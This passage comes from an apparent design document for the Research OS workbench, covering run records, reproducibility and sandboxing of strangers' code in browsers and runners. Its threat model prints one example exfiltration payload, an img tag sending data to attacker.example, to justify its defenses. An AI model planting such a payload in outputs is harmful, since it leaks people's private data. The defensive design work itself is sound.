| `id`, `owner_id`, `created_at`, `visibility` | who asked for it and when; who may see it, the strictest visibility among its inputs unless its owner published it |
| `path` | browser, runner, import, or link |
| `runner_id` | the registered machine, a person's or a service runner, for a runner run |
| `recipe` | the kind (function, script, notebook, LaTeX build, Lean check, engine campaign, software citation), a name and version for a built-in function, or the SHA-256 of the code for custom code |
| `params` | the arguments, as JSON |
| `inputs` | each input's kind (node, import, production, run, or runner file), its id, and its SHA-256 |
| `environment` | the runtime and its version, a lock file's SHA-256 (`pyodide-lock.json` in the page, `pylock.toml` or `renv.lock` on a runner) or an OCI image digest, and the machine's operating system and architecture |
| `seed` | the random seed, set by Research OS when the recipe does not set one, and the generator it seeds |
| `tolerance` | how numeric outputs are compared: the value a built-in function declares, or for custom code, notebooks, imports, and link runs a default of a relative difference of 1e-9, which the owner can change before anyone reproduces the run |
| `exemptions` | for a trusted job, what it was allowed beyond the sandbox: the network hosts it could reach and the login it used |
| `status`, `started_at`, `finished_at`, `error` | queued, running, succeeded, failed, or cancelled |
| `outputs`, `log_sha256` | each output's path, SHA-256, size, and media type |
| `reproduces` | the run this one repeats, and the comparison's result |

Every field maps onto [W3C PROV-O](https://www.w3.org/TR/prov-o/): the run is an activity, its inputs are entities it used, its outputs are entities it generated, and the person and the runner are agents associated with it. An accepted production exports its runs as a Workflow Run RO-Crate under the Process Run Crate profile, so the record leaves Research OS in a format other tools read.

A production cites a run through its evidence, as `{run_id, output}` beside the quote entries it holds today. `/api/research-os/production` stores `evidence` as the client sends it (`src/app/api/research-os/production/route.ts`, the `row` it upserts), so the route gains a check at write time: every `run_id` in the evidence must name a run the author owns or can see, and the save is refused otherwise. `NodeView` gains a runs list beside its quotes, and `ProduceForm` adds the runs a person attaches to the evidence it starts from. On acceptance `createNodeFromProduction` adds the run ids to the new node's provenance, so a citation of the node reaches the computation behind it.

A public node can rest on a private run. Its page then shows the run as a private run: its path, its recipe's name, its mark, and the hashes of its outputs, with the inputs and the outputs held back. At submission the author can publish the run with the production, which the form allows when every input is public or the author's own. Publishing shows the run's record and outputs; an input that is the author's own private import stays private, so the published run keeps the mark reproducible by its owner. The reviewer sees the run's record and outputs through the production under review.

#### How a result is reproduced

A run carries one of two marks, and the node page names what the next one needs.

- **Reproducible by its owner** when four things are pinned: the recipe by hash or by function name and version, the environment by lock file or image digest, every input by hash, and the seed.
- **Reproducible by anyone** when, beyond the four pins, everyone who can see the run can also read every input and fetch the environment: public nodes, public imports, outputs of public runs, and a lock file or an image anyone can pull. A file that stays on a runner, or a private import, keeps a run at the first mark.

Reproducing queues the same recipe on the same inputs, in the same environment, on a path the person picks, in their own browser or on a runner they may use, and it needs `replicate` on every node and import among the inputs. Outputs are compared by hash first. When the hashes differ, each numeric output is compared within the run's tolerance, since the same code gives different floating-point results on different hardware and libraries, the problem BOINC's homogeneous redundancy answers. The comparison is written on the new run, a match by someone else raises the first run's count of reproductions, and the person can submit the new run as a replication production of the production the first run supports, which the review queue already handles.

Two kinds of run cannot be repeated bit for bit, and their records say so:

- **Model-backed runs.** An engine campaign in live mode calls a model. The engine caches every call by a hash of the model and the prompt (`hte/llm.py`), and a `replay_only` run reads only from that cache. The cache lives in the campaign's temporary directory, and `hte-serve` calls `hypothesize(request)` with no `config` (`hte/serve.py`), so no request can point a campaign at an older cache. The proposal keeps the cache as an output of the run and adds a cache input to the engine's request, the hash of a stored cache the engine unpacks and replays. Both are engine changes for `hte/integration`.
- **Import and link runs.** Research OS did not execute them. Reproducing one means running its recipe for the first time on a browser or a runner, when the files carry enough to do that. A notebook with its code and data carries enough. A PDF alone gives nothing to run.

#### Security

Four directions: a stranger's code in a person's tab, the data a person hands that code, the same code on a person's machine, and a machine's results reaching the graph.

**Code in the browser.** The person opening a public production's notebook to rerun it runs a stranger's code in their own tab. On the app's origin that code could call every Research OS route as the person: `fetch` sends cookies on same-origin requests by default ([MDN](https://developer.mozilla.org/en-US/docs/Web/API/RequestInit)), and `verifyRequestUser` accepts the session cookies. The browser path therefore runs code in an iframe whose `sandbox` attribute leaves out `allow-same-origin`, which gives the frame an origin that "always fails the same-origin policy" ([MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)), and leaves out popups and top-level navigation.

The interpreter runs in a Web Worker inside that frame. A worker's script "must be same-origin with the caller's document, or a `blob:` or `data:` URL" ([MDN, Worker()](https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker)), and an opaque origin matches no URL, so the frame fetches the worker script over CORS and starts it from a `blob:` URL. A `blob:` worker "does inherit the CSP of the document or worker that created it" ([MDN, using web workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers)), so the frame's Content Security Policy governs the worker: `default-src 'none'` covers what the policy leaves unnamed, `worker-src blob:` lets the worker start, `script-src` names the pinned runtime files and `'wasm-unsafe-eval'`, without which "WebAssembly is blocked from loading and executing" ([MDN, script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)), and `connect-src` names the same files and nothing else. The runtime files carry CORS headers for the same reason. Data goes in and results come out by `postMessage`, and a run past its time limit ends when its worker is terminated. Step 2 of the build order tests the worker start and the policy in the browsers the app supports. The app sends no cross-origin isolation headers, so webR talks over its `postMessage` channel; Pyodide runs one thread and needs none.

**The data a person hands that code.** A stranger's code reads whatever the person runs it on, a private import included, and its outputs are the way out. A sanitizer that strips scripts can still keep images, so an output carrying `<img src="https://attacker.example/?d=...">` would send the data out when the node page rendered it, on an origin that sends no Content Security Policy (`next.config.mjs`). Four rules close that path:

- the compute frame's `connect-src` names the pinned runtime files alone, so the worker can post data nowhere, and micropip installs from the pinned lock file alone;
- outputs render in a second opaque-origin frame whose policy is `default-src 'none'; img-src data: blob:`, so nothing in an output reaches the network;
- the sanitizer strips every remote URL from an output before it is stored: `src`, `href`, `srcset`, and CSS `url()` values that point off the page;
- the node page, on the app's origin, shows an output as text, or as an image from a `data:` or `blob:` URL, and renders no output HTML.

A sandboxed job on a runner has no network, so its outputs are its one way out, and they pass the same sanitizer and the same output frame.

**Code on a runner.** In ros-workbench 2 a person's runner takes only jobs its owner submitted. That keeps GitHub's rule for self-hosted runners: a machine runs code from people its owner knows. A job's code can still come from someone else, since reproducing a public production runs its author's recipe, so every job that carries a recipe runs sandboxed, and trusted jobs, below, are the one exception:

- a rootless Podman container with `--network=none` and `--read-only`, the inputs mounted read-only, one writable output directory, and limits on CPU, memory, process count, and wall-clock time, with the image pinned by digest;
- for a LaTeX build on the host's TeX Live, a bubblewrap namespace started with `--unshare-all`, `--clearenv`, `--die-with-parent`, `--ro-bind` of `/usr` and `/etc/texlive`, `--bind` of the job directory, and `--tmpfs /tmp`, running `pdflatex -no-shell-escape`. Run on this machine on 2026-09-21 with bubblewrap 0.10.0, a document that `\input`s a file outside the job typeset that file's contents outside the namespace and stopped with "not found" inside it. A clean document compiled inside it. Inside, the job saw no `/home` and had no network ("Network is unreachable"); its environment held the variables set with `--setenv` and those the shell sets itself. TeX Live 2026 has no reading restriction left to set, so the namespace is the boundary for reads;
- no inbound port and no tunnel. The runner polls Research OS over outbound HTTPS with its own token, the pattern GitHub's runner uses, which also fixes the rotating tunnel URL of the first research-tools host;
- a token per runner, shown once at registration, stored hashed, scoped to claiming its owner's jobs and uploading their outputs, and revocable from the person's profile. `hte-serve` trusts any caller on localhost. A runner talks to Research OS across a network, so it proves who it is with the token.

**Trusted jobs.** An engine campaign in live mode shells out to `claude -p` under the machine's login (`hte/llm.py`; the comment in `scripts/systemd/hte-serve.service`), which needs the network and the login's files in the home directory, and the sandbox forbids both. The engine is therefore a trusted job kind. A trusted job runs code its runner's owner installed, the engine at a recorded commit, and never a recipe that arrives with a job; it may reach the model API's hosts and nothing else, with the login mounted for the job, and the run records both in `exemptions`. In the first step of the build order the engine still runs as `hte-serve.service` does today, with the whole home directory and an open network, and its runs record that exemption; ros-workbench 2 narrows it to the model API's hosts and the login. The node page marks a trusted run as one.

**What never enters a sandboxed job.** The runner's token and the machine's environment stay outside the sandbox: a job starts with an empty environment and the variables its recipe declares, and its container or namespace sees the job directory alone. A job that needs a credential, a paid feed402 call for instance, gets it from Research OS for that job and loses it when the job ends. `hte-serve.service` loads no `~/.env`, so no API key reaches the engine, and it runs with the whole home directory and the machine's login, which is what a trusted job is allowed and a sandboxed job is refused.

**Results from a runner.** Research OS recomputes the SHA-256 of every uploaded output and stores it against the runner that sent it, so a result is attributable to a machine and its owner. The environment a runner reports is its claim, as a tab's is, and its result is self-reported until someone else reproduces it. For pooled runners the rule comes from BOINC, which sends the same work unit to several volunteers and accepts a result when a quorum agrees: a pooled result counts toward anything public once a second runner, owned by someone else, reproduces it. Incentives, when they come, pay for validated work alone, since BOINC's credit system had to answer volunteers who claimed credit they had not earned.

Pooled runners, taking strangers' jobs, come later. They need a boundary stronger than namespaces, such as gVisor or a microVM, and they need their results validated. They run open code alone. The atlas's rule holds for closed tools: one reaches a runner only under the person's own license, on the person's own machine.

#### Failure and the owner's policy

- A runner claims a job under a lease and renews it while it works. A lease that lapses returns the job to the queue, the way BOINC reissues a result past `delay_bound` and Folding@home reassigns a work unit past its timeout.
- A lapsed lease or a runner crash retries the job up to three times, the default Ray gives a task whose worker died. A nonzero exit from the job's own code fails the run at once, as Ray leaves exceptions from application code unretried, and the log is kept as an output either way.
- The owner sets when the runner takes work, always or when the machine is idle, which is HTCondor's `START` expression in the runner's settings. A job preempted when the owner returns goes back to the queue.
- A runner reports its CPU, GPU, memory, and installed runtimes at registration and on each poll, and a job names what it needs, so the queue matches the two the way HTCondor matches job ads to machine ads.

#### What imports owe the workbench

- **ros-import 1**, data model and storage: a SHA-256 on every stored file, storage paths keyed by owner and hash so a new upload is a new version and never replaces bytes a run read, the file's size and media type, and Storage policies by owner and grant.
- **ros-import 2**, upload: notebooks and scripts (`.ipynb`, `.qmd`, `.Rmd`, `.py`, `.R`) and LaTeX projects (`.tex`, `.bib`, `.sty`, or a zip of the project) accepted and typed, with an RO-Crate zip read as a bundle of both and its metadata.
- **ros-import 3**, extraction: for CSV, TSV, XLSX, and Parquet, the column schema with types, counts, null counts, and a preview, which the workbench's function forms read to offer columns; for notebooks, Markdown cells as passages for quote and check, and code cells kept as code with their outputs sanitized; for LaTeX, the text as passages.
- **ros-import 5**, sharing: a run on a shared import needs the owner's `continue` grant for a new analysis and `replicate` to reproduce one, the roles `graph.node_grants` names and `can` checks exactly.
- **ros-import 6 and 7**, hosted and self-hosted feed402 datasets: a response from a dataset endpoint is an input like a file, stored by hash with its receipt kept as the citation.

The 50 MiB file limit in the local stack's `supabase/config.toml` bounds the first slice's datasets, and the browser path's memory bounds them further; larger tables go to a runner.

#### The engine

The engine already runs research compute on this machine: a campaign runs behind a localhost service, for a production the caller owns. It becomes a producer of runs in the first step, as a trusted job on the service runner:

- `/api/research-os/hypothesize` writes a run for every call: path runner, the engine host's `runner_id`, recipe `engine campaign` at the engine's commit, the production as an input hashed by its canonical JSON, and the response's `run_id`, `artifact_version`, `models`, and corpus counts.
- The engine's response adds `git_sha`, `config`, the seeds, and the preregistration hash from its manifest, and keeps the model cache as an output. `_git_sha` in `hte/runner.py` runs `git rev-parse --short HEAD` when each campaign starts, with no mark for uncommitted changes, while the service runs from a checkout that takes fast-forward pulls, so the proposal records the commit and a dirty flag once, when the process starts. These are engine changes, so they go to `hte/integration` under the branch policy.
- A campaign that runs past the route's timeout becomes a queued job the service runner claims, in place of a request held open for up to 600 seconds.
- An engine run is reproduced through the proposed cache input: a `replay_only` request replays the stored production JSON against the kept cache, with no model call. The production's owner rule governs a new campaign; a replay reads only the run's stored outputs, so anyone who can see the run can replay it.

#### Directions from the atlas

The software atlas, ros-workbench 0, ends with four directions for the workbench (`SOFTWARE-ATLAS.md`, "Directions for the workbench", read at commit `dc17e1501` on its branch, draft PR #203). The design takes each one.

1. **link, for every row.** A production or an import carries a software citation, the tool, its version, its license, and a URL, with the output file when there is one. It reaches all 64 atlas rows, closed tools included, and six rows start there, Mathematica and Earth Engine among them. Here it is the link run, and the first producer of runs.
2. **browser, one Pyodide worker, then webR.** Twenty-five of the forty research tools ran in Pyodide 314.0.7 in the atlas's run of 2026-09-21, twenty-four of them giving the CPython answer, while the gateway that serves all forty did not answer. The atlas measured a first load of 13.4 MB for the core and 53.3 MB with every package those tools import, and a second run the same day measured 13.5 MB and 53.4 MB. The same worker carries ros-workbench 3's statistics, and webR, whose packages include haven for statistics files, is the second worker. Here it is the opaque-origin frame and its worker.
3. **import, one format and one viewer at a time.** Closed tools meet the web through their export formats, and each format costs a parser with a node shape, and a viewer under its own license. After tables, the atlas's order follows reach: statistics files (`.sav`, `.dta`, `.sas7bdat`, `.xpt`), meshes and scenes, molecules, and qualitative-research projects in `.qdpx`, then the formats with one or two rows behind them. Here it is what imports owe the workbench, and the reported run.
4. **runner, Lean first.** The repository builds two Lean projects under `papers/`, and `lake env lean --json` reports each message as a line of JSON, a `hasSorry` message among them in a run on 2026-09-21, so the first job has known answers to test against. A paper's Lean check is a rule in `papers/PAPER-STANDARDS.md` that nothing outside the author's machine enforces. LaTeX builds follow, then TrajMine and CryoTriage, which stay synthetic until a machine with a GPU runs them, then the heavy simulation codes: GROMACS on a GPU, OpenFOAM over MPI, LAMMPS, and Geant4. Here it sets the runner's job kinds.

The atlas also names what Research OS shows for a tool's output, a static export or a web viewer named in the tool's row, and the workbench's first outputs are static files: tables, images, PDFs, and logs.

#### Build order

Local First sets where each step runs: on this machine against the local stack first. The atlas's directions set the order of the paths: link, browser, import, runner. The browser steps compute in the tab and write their runs and outputs to the server, the local stack on this machine and the hosted one on the site.

1. **The run record, with link runs and the engine.** The `graph.runs` and `graph.runners` migrations, with the engine host registered as the first service runner, and outputs in local Storage. The first producers compute nothing new: a software citation on a production, written as a link run from one line in the production form, and the hypothesize route, which writes an engine run for every call. The node page's workbench section lists runs.
2. **One Pyodide worker, the browser path.** The opaque-origin frame and its `blob:` worker, with its Content Security Policy and `'wasm-unsafe-eval'` tested in the browsers the app supports, and the output frame with its sanitizer. Pyodide's files are served from the app's own origin so this machine needs no CDN, and the lock file is pinned. Its first use is the research tools the atlas ran in Pyodide, which keeps them running whatever the gateway does. webR joins for R.
3. **ros-import 1 to 3, then the import path.** Storage and upload, then extraction, come from the ros-import epic, tables first; each further format adds a parser and a viewer, in the order the atlas sets.
4. **ros-workbench 2, the runner on this machine.** A `bucket-runner` user unit beside `hte-serve.service`, registered to the founder's account, polling the local stack. Job kinds in the atlas's order: Lean checks of a paper's `lean/` project; LaTeX builds of `papers/template` in the bubblewrap namespace the security model describes; notebooks executed headless through `nbclient` in rootless Podman; then TrajMine and CryoTriage on this machine's Radeon, and the heavy simulation codes after them. Engine campaigns move from the service runner's request path to its queue as trusted jobs. Every tool it needs is installed here, R aside.
5. **ros-workbench 3, statistics and plots.** Built-in functions over an imported table on the worker from step 2: summaries, group summaries, the common tests, correlation, and regression, each drawn as a plot, with the runner taking tables past the browser's memory. The spreadsheet view reads ros-import 3's preview.
6. **ros-workbench 4, machine learning.** Regression, classification, clustering, and embeddings as functions with a fixed seed and a held-out split recorded on the run, in the browser for small tables and on the runner otherwise. AutoML and large embeddings run on a runner, where this machine's GPU is.
7. **ros-workbench 5, custom code and LaTeX.** Code cells in Python and R on the browser worker, with notebook import and export; and LaTeX documents that attach to a production and compile on a runner, with an in-browser engine as an option once one is maintained.

Pooled runners and incentives come after all seven, and each waits on the validation rule for pooled results.

### Decisions

- The workbench adds one object, the run. Node kinds and production kinds stay as they are: a run is evidence for a production, and a production's node carries its runs.
- Every run names its path, browser, runner, import, or link. It starts self-reported, and the node page shows how many other people reproduced it.
- A run is reproducible by its owner when its recipe, environment, inputs, and seed are pinned, and by anyone when every input and the environment are readable too. Reproducing it on a second machine is a replication production.
- A stranger's code runs in the browser in an opaque-origin frame whose worker reaches no network, and on a runner in a sandbox with no network and no files outside the job. Its outputs render with no remote URL.
- A person's runner takes its owner's jobs alone. Trusted jobs, the engine first, run code the runner's owner installed and record their exemptions on the run.
- The paths ship in the atlas's order, link, browser, import, runner, on this machine first: the run record with link runs and engine runs, then one Pyodide worker, then imports, then the runner with Lean checks first.
